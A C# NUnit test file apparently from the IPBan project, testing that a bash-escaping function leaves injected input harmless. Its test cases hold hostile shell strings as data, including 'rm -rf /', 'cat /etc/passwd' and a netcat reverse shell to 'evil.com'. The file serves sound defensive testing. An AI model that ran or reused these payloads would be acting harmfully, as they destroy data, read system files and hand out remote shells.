/*
MIT License

Copyright (c) 2012-present Digital Ruby, LLC - https://ipban.com

Tests for ProcessUtility.BashEscape — covers the shell-escaping primitive used by
CreateDetachedProcess to keep operator-supplied path/argument strings inert when
they end up inside a bash script.
*/

using DigitalRuby.IPBanCore;

using NUnit.Framework;
using NUnit.Framework.Legacy;

namespace DigitalRuby.IPBanTests
{
    /// <summary>
    /// ProcessUtility.BashEscape — the security-critical primitive for safely embedding
    /// strings inside the temp shell script that CreateDetachedProcess writes. Full end-to-end
    /// CreateDetachedProcess coverage requires `at` / `schtasks`, so it is left to manual
    /// runs on a real host; this fixture covers the escape function in isolation.
    /// </summary>
    [TestFixture]
    public sealed class IPBanProcessUtilityTests
    {
        [Test]
        public void NullBecomesEmptyQuotedString()
        {
            ClassicAssert.AreEqual("''", ProcessUtility.BashEscape(null));
        }

        [Test]
        public void EmptyStringBecomesEmptyQuotedString()
        {
            ClassicAssert.AreEqual("''", ProcessUtility.BashEscape(""));
        }

        [Test]
        public void SimpleStringIsSingleQuoted()
        {
            ClassicAssert.AreEqual("'/usr/bin/example'", ProcessUtility.BashEscape("/usr/bin/example"));
        }

        [Test]
        public void EmbeddedSingleQuoteIsEscapedWithCanonicalIdiom()
        {
            // canonical bash idiom: ' becomes '\''  (close-quote, escaped quote, reopen-quote)
            ClassicAssert.AreEqual(@"'it'\''s'", ProcessUtility.BashEscape("it's"));
        }

        [TestCase(";rm -rf /;", "';rm -rf /;'")]
        [TestCase("$(whoami)", "'$(whoami)'")]
        [TestCase("`id`", "'`id`'")]
        [TestCase("&& cat /etc/passwd", "'&& cat /etc/passwd'")]
        [TestCase("path with spaces", "'path with spaces'")]
        [TestCase("|| nc evil.com 4444 -e /bin/sh", "'|| nc evil.com 4444 -e /bin/sh'")]
        [TestCase(">/dev/null;curl evil", "'>/dev/null;curl evil'")]
        public void HostileShellMetacharactersAreInert(string input, string expected)
        {
            // each of these would do something nasty if concatenated into a bash -c string.
            // single-quoted, they are inert literals — bash treats every byte until the next
            // unescaped single quote as raw text.
            ClassicAssert.AreEqual(expected, ProcessUtility.BashEscape(input));
        }

        [Test]
        public void MultipleSingleQuotesAreAllEscaped()
        {
            // every single quote in the input must get its own '\'' replacement
            ClassicAssert.AreEqual(@"'a'\''b'\''c'", ProcessUtility.BashEscape("a'b'c"));
        }
    }
}
